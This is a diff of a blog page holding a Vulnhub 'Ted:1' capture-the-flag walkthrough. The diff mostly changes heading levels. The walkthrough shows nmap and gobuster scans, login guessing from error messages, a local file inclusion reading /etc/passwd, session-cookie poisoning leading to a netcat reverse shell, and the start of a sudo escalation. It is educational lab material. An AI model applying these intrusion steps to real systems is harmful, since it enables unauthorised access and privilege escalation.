@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>September 24, 2020</span> by <span>Nasef</span></p>
 <h2 class=blog-title>Ted:1 Vulnhub Walkthrough</h2>
+<p><span>September 24, 2020</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
 <p>Ted:1 is a machine in which I used Local File Inclusion Vulnerability to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
-<h2 id=scanning>Scanning</h2>
+<h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with nmap</p>
 <pre><code>nmap -sV -sC 192.168.198.136
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 09:58 EDT
@@ -74,7 +74,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
 
 </code></pre><p>Port 80 is the only opened port.</p>
-<h2 id=web-enumeration>Web Enumeration</h2>
+<h3 id=web-enumeration>Web Enumeration</h3>
 <p>Then I enumerated directories and files using gobuster</p>
 <pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.136 -x html,php
 ===============================================================
@@ -101,17 +101,17 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 2020/09/24 09:59:06 Finished
 ===============================================================
 </code></pre><p>An intersting file is cookie.php, although it didn&rsquo;t help me to get a shell but it gave me a hint about using cookie with LFI to gain a shell.</p>
-<h2 id=brute-forcing>Brute forcing</h2>
+<h3 id=brute-forcing>Brute forcing</h3>
 <p>I found a login form in index.php, So I tried SQLmap to test for SQL injection but the form isn&rsquo;t vulnerable to it.
 Then, I started testing with inputs and error messages and it was fruitful. The error messages gave me hints about the the correct username and correct password then the correct hashing algorithm. You can see the diffrence below.</p>
-<h3 id=username-guessing>Username guessing</h3>
+<h5 id=username-guessing>Username guessing</h5>
 <p><img src=/images/blog/001/1.png alt=Username></p>
-<h3 id=password-guessing>Password guessing</h3>
+<h5 id=password-guessing>Password guessing</h5>
 <p><img src=/images/blog/001/2.png alt=Password></p>
-<h3 id=hashing-algorithm-guessing>Hashing Algorithm guessing</h3>
+<h5 id=hashing-algorithm-guessing>Hashing Algorithm guessing</h5>
 <p><img src=/images/blog/001/3.png alt=Hash></p>
 <p>The correct username is admin and the correct password is hash sha256 of word admin</p>
-<h2 id=local-file-inclusion>Local File Inclusion</h2>
+<h3 id=local-file-inclusion>Local File Inclusion</h3>
 <p>When I typed /etc/passwd it retrived the content of the file, so it&rsquo;s clearly a LFI vulnerability.
 <img src=/images/blog/001/4.png alt=Hash></p>
 <p>After many attemps like reading /etc/shadow and Log poisoning via apache logs, I found a suspicous cookie. so I tried to change it&rsquo;s value and access /var/lib/php/sessions/sess_ via the browser and it worked!
@@ -126,7 +126,7 @@ listening on [any] 9999 ...
 connect to [192.168.198.137] from (UNKNOWN) [192.168.198.136] 57674
 whoami
 www-data
-</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
+</code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>I ran sudo -l and noticed that I can run apt-get as a root without password (SUDO).</p>
 <pre><code>sudo -l
 Matching Defaults entries for www-data on ubuntu:
